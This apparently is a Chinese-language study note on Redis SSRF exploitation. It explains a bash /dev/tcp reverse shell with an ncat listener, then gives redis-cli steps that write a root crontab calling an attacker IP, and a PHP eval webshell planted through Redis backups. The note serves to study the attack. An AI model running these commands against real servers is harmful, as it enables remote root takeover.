# Redis SSRF Lab

ref: https://blog.csdn.net/mole_exp/article/details/124640099

## 原理

反向 shell: 有別於一般的遠端 ssh，使用個人電腦 ssh 遠端電腦。反向 shell 是讓受害電腦主動開啟 shell 後把 stdin/stdout/stderr 等傳遞給攻擊者。

### 受害者端

重要命令(每款 OS 與版本, 可能需要不同命令, 基於權限設置差異)

`bash -i >& /dev/tcp/192.XXX.X.XXX/443 0>&1`

- bash: 開啟 bash shell
- -i: 開啟交互式 shell
- `>&` /dev/tcp/192.XXX.X.XXX/443: 將 stdout/stderr 等重定向到指定的 TCP 連接
- `0>&1`: 將 stdin 重定向到 stdout

等於是開啟一個 bash，主動把 IO 給遠端，讓他們操作。

### 攻擊者端

遠端使用的方法是 `ncat -l -v -p 443`

- -l: 監聽模式
- -v: 雙向通訊模式
- -p 443: 指定監聽的 port 為 443

如此可以接收受害電腦上 shell 的輸入和輸出。

## 使用 redis-cli 植入 crontab 木馬

假設:

- 已經成功劫持 redis-cli，可以自由操作受害機 redis
- redis 可以執行任意命令
- redis 擁有足夠權限

以下描述攻擊順序

- 先使用 `redis-cli flushall` 清除所有 key-value pair，避免殘餘資料影響後續操作
- 在 redis 中 `set` key-value pair，其中 value 是一個 crontab 任務指令。例如：`\n\n\n\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.3.36/443 0>&1'\n\n\n\n\n`，
- 此處換行符號(`\n`)為任意多個，避免後續動作中該段文字和其餘文字連到一起互相干擾。
- 此處 `* * * * * /bin/bash -c` 是 crontab 任務指令的格式，其中 `* * * * *` 表示每分鐘執行一次，`/bin/bash -c 'XXX'` 是要執行的命令。
- 接著利用 redis 的備份方案可以把這個 key-value pair `save` 到 local file 上，如果該 file 會被 OS 視為 crontab 任務指令自動被執行時，就表示攻擊成功了。
- 所以利用 `redis-cli config set dir /var/spool/cron` 讓 redis 的備份目錄變更到 crontab 目錄
- 接著用 `redis-cli config set dbfilename root` 讓備份的 file 名稱變更為 root，此時該 crontab 任務會被 root 身分執行。
- 最後寫下 `redis-cli save` 將 crontab 任務指令寫入到 `/var/spool/cron/root` 上，完成攻擊。

## 使用 redis-cli 植入 webshell 木馬

假設:

- 已經成功劫持 redis-cli，可以自由操作受害機 redis
- redis 可以執行任意命令
- redis 擁有足夠權限
- 存在已執行的網頁伺服器，該 server 可以執行任意檔案

以下描述攻擊原理

類似 crontab 木馬，差異在 redis 中 `set` 的 value 是 webshell 程式碼，例如:

```php
<?php eval($_GET['cmd']); ?>
```

接著把 redis 備份到網頁後端可以 access 的資料夾中。

最後因為 webshell 存在於網頁後端，access 範圍，使用任意檔案讀取漏洞可以調用該 webshell 來執行任意命令。
